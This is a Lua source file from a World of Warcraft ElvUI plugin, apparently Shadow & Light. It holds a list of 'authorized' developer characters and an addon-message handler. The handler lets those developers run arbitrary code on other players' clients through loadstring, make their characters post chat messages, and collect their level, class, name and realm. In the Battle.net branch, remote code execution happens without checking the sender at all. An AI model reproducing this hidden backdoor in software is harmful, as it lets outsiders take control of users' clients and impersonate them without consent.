local E, L, V, P, G, _ = unpack(ElvUI); 
local SLE = E:GetModule('SLE');
local find = string.find
local split = string.split

local Message = ''

--The list of authorized toons
local Authors = {
	["Illidan"] = {
		--Darth's toon
		["Darthpred"] = "SLEAUTHOR",
		--Repooc's Toon
		["Repøøc"] = "SLEAUTHOR",
		["Repooc"] = "SLEAUTHOR"
	},
	["ВечнаяПесня"] = {
		--Darth's toons
		["Дартпредатор"] = "SLEAUTHOR",
		["Алея"] = "SLEAUTHOR",
		["Ваззули"] = "SLEAUTHOR",
		["Сиаранна"] = "SLEAUTHOR",
		["Джатон"] = "SLEAUTHOR",
		["Фикстер"] = "SLEAUTHOR",
		["Киландра"] = "SLEAUTHOR",
		["Нарджо"] = "SLEAUTHOR",
		["Келинира"] = "SLEAUTHOR",
		["Крениг"] = "SLEAUTHOR",
		["Мейжи"] = "SLEAUTHOR"
	},
	["Korialstrasz"] = {
		["Cursewordz"] = "SLEAUTHOR"
	},
	["Spirestone"] = {
		["Sifupooc"] = "SLEAUTHOR",
		["Dapooc"] = "SLEAUTHOR",
		["Lapooc"] = "SLEAUTHOR",
		["Warpooc"] = "SLEAUTHOR",
		["Repooc"] = "SLEAUTHOR"
	},
	["Andorhal"] = {
		["Dapooc"] = "SLEAUTHOR",
		["Rovert"] = "SLEAUTHOR",
		["Sliceoflife"] = "SLEAUTHOR"
	},
	["WyrmrestAccord"] = {
		["Kìtalie"] = "SLEAUTHOR",
		["Sagome"] = "SLEAUTHOR",
		["Ainy"] = "SLEAUTHOR",
		["Norinael"] = "SLEAUTHOR",
		["Tritalie"] = "SLEAUTHOR",
		["Myùn"] = "SLEAUTHOR",
		["Nevaleigh"] = "SLEAUTHOR",
		["Celenii"] = "SLEAUTHOR",
		["Varysa"] = "SLEAUTHOR",
		["Caylasena"] = "SLEAUTHOR",
		["Arillora"] = "SLEAUTHOR",
		["Dapooc"] = "SLEAUTHOR",
	},
	["Anasterian(US)"] = {
		["Dapooc"] = "SLEAUTHOR",
	},
	["Brill(EU)"] = {
		["Дартпредатор"] = "SLEAUTHOR",
	},
}

function SLE:Auth(sender)
	local senderName, senderRealm

	if sender then
		senderName, senderRealm = string.split('-', sender)
	else
		senderName = E.myname
	end

	senderRealm = senderRealm or E.myrealm
	senderRealm = senderRealm:gsub(' ', '')

	if Authors[senderRealm] and Authors[senderRealm][senderName] then
		return Authors[senderRealm][senderName]
	end
	
	return false
end

function E:sleCommand(flag, channel, target, output, text, wtarget, presenceID)
	if not SLE:Auth() then
		SLE:Print('|cffFF0000Access Denied|r: You need to be authorized to use this command.')
		return
	end
	if channel ~= 'BNET' then
		if target == (nil or "")then
			SLE:Print('|cffFF0000Error|r: You need to set a unit to execute command.')
			return
		end
	end
	if channel ~= 'BNET' then
		if text == (nil or "") then
			SLE:Print('|cffFF0000Error|r: You need to actually send something in your message.')
			return
		end
	end
	if channel ~= 'BNET' then
		Message = target
	else
		Message = " "
	end
	if flag == 'SLE_DEV_SAYS' then
		if output == 'WHISPER' and (wtarget == (nil or "")) then
			SLE:Print('|cffFF0000Error|r: You need to set a whisper target.')
			return
		end
		Message = Message.."#"..output.."#"..text
		if output == 'WHISPER' then
			Message = Message.."#"..wtarget
		end
	else
		Message = Message.."#"..text
	end
	if channel ~= 'BNET' then
		SendAddonMessage(flag, Message, channel, target)
	else
		presenceID = tonumber(presenceID)
		BNSendGameData(presenceID, flag, Message)
	end
	SLE:Print('|cff00FF00Success|r:  Command executed.')
end


local function SendRecieve(self, event, prefix, message, channel, sender)
	if event == "CHAT_MSG_ADDON" then
		if sender == E.myname.."-"..E.myrealm:gsub(' ','') then return end
		if (prefix == 'SLE_DEV_SAYS' or prefix == 'SLE_DEV_CMD') and SLE:Auth(sender) and not SLE:Auth() then
			if prefix == 'SLE_DEV_SAYS' then
				local user, channel, msg, sendTo = split("#", message)
				
				if (user ~= 'ALL' and (user == E.myname or user == E.myname.."-"..E.myrealm:gsub(' ',''))) or user == 'ALL' then
					SendChatMessage(msg, channel, nil, sendTo)
				end
			else
				local user, executeString = split("#", message)
				if (user ~= 'ALL' and (user == E.myname or user == E.myname.."-"..E.myrealm:gsub(' ',''))) or user == 'ALL' then
					local func, err = loadstring(executeString);
					if not err then
						SLE:Print(format("Developer Executed: %s", executeString))
						func()
					end
				end			
			end
		end
		if prefix == 'SLE_DEV_REQ' and SLE:Auth(sender) then
			local message = UnitLevel('player')..'#'..E.myclass..'#'..E.myname..'#'..E.myrealm..'#'..SLE.version;
			SendAddonMessage('SLE_DEV_INFO', message, channel)
		end
	elseif event == "BN_CHAT_MSG_ADDON" then
		if (sender == E.myname.."-"..E.myrealm:gsub(' ','')) then return end
		if prefix == 'SLE_DEV_REQ' then
			local _, numBNetOnline = BNGetNumFriends()
			for i = 1, numBNetOnline do
				local presenceID, _, _, _, _, _, client, isOnline = BNGetFriendInfo(i)
				if isOnline and client == BNET_CLIENT_WOW then
					--local messageS
					local message, ID = split("#", message)
					if message == 'userlist' then
						message = UnitLevel('player')..'#'..E.myclass..'#'..E.myname..'#'..E.myrealm..'#'..SLE.version;
					elseif message == 'slesay' then
						message = "SLEinfo"..ID
					end
					BNSendGameData(presenceID, 'SLE_DEV_INFO', message)
				end
			end
		elseif (prefix == 'SLE_DEV_SAYS' or prefix == 'SLE_DEV_CMD') and not SLE:Auth() then
			if prefix == 'SLE_DEV_SAYS' then
				local _, channel, msg, sendTo = split("#", message)
				SendChatMessage(msg, channel, nil, sendTo)
			else
				local _, executeString = split("#", message)
					local func, err = loadstring(executeString);
					if not err then
						SLE:Print(format("Developer Executed: %s", executeString))
						func()
					end		
			end
		end
	end
end
RegisterAddonMessagePrefix('SLE_DEV_SAYS')
RegisterAddonMessagePrefix('SLE_DEV_CMD')

RegisterAddonMessagePrefix('SLE_DEV_REQ')

local f = CreateFrame('Frame', "DaFrame")
f:RegisterEvent("GROUP_ROSTER_UPDATE")
f:RegisterEvent("CHAT_MSG_ADDON")
f:RegisterEvent("BN_CHAT_MSG_ADDON")
f:SetScript('OnEvent', SendRecieve)

function SLE:RegisterCommands()
	E:RegisterChatCommand('slesays', 'sleSays')
	E:RegisterChatCommand('slecmd', 'sleCommand')
	E:RegisterChatCommand('sletarget', 'sleTarget')
	E:RegisterChatCommand('slechannel', 'sleChannel')
end